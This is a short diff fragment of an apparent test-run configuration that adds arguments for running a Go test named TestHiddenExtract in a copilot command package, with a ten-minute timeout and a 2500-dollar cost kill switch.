+          - "./pkg/cmd/copilot"
+          - "-run"
+          - "TestHiddenExtract"
+          - "-count=1"
+        timeoutMs: 600000
+costKillSwitchUsd: 2500
